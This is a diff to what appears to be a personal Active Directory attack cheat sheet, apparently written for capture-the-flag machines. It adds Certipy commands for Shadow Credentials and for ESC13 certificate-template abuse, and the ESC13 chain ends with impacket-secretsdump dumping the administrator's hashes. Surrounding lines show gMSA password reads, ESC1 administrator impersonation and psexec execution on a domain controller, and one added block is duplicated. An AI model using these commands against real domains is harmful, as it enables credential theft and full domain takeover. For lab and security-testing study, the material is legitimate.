@@ -556,6 +556,9 @@ KRB5CCNAME='$USERNAME.ccache' evil-winrm -i $DC -r $DOM
 +---------- ReadGMSAPassword ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object 'SVC_ACC$' --attr msDS-ManagedPassword
 
++---------- AddKeyCredentialLink ----------+
+certipy shadow auto -dc-ip $TARGET -target $DC -k -account 'SVC_CABACKUP'
+
 +---------- AddSelf ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'; kcme
 
@@ -665,6 +668,9 @@ https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage
 impacket-getTGT $DOM/'$USERNAME:$PASSWORD'; kcme
 impacket-getTGT $DOM/'$USERNAME' -hashes ':'; kcme
 
++---------- AddKeyCredentialLink ----------+
+certipy shadow auto -dc-ip $TARGET -target $DC -k -account 'SVC_CABACKUP'
+
 +---------- ESC1 ----------+
 adminSid=$(certipy account -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -user 'administrator' read 2>/dev/null | grep 'objectSid' | cut -d ':' -f2 | xargs -n1); certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template '' -upn 'administrator' -sid "$adminSid" -target $DC -key-size '4096'
 certipy auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator.pfx'
@@ -682,6 +688,13 @@ certipy ca -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -issue-request
 certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -retrieve ''
 certipy auth -dc-ip $TARGET -domain $DOM -pfx 'administrator.pfx'
 kcme; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
+
++---------- ESC13 ----------+
+certipy req -dc-ip $TARGET -target $DC -k -ca "$CA" -template 'VulnerableTemplate' -upn 'NEW_UPN' -key-size 4096
+certipy auth -dc-ip $TARGET -pfx 'generated.pfx'; kcme
+certipy req -dc-ip $TARGET -target $DC -k -ca "$CA" -template 'DifferentTemplate' -key-size 4096
+certipy auth -dc-ip $TARGET -pfx 'generated.pfx'; kcme
+impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
 
 +---------- Request ----------+
 certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template '' -upn 'Administrator' -target $DC -key-size '4096'
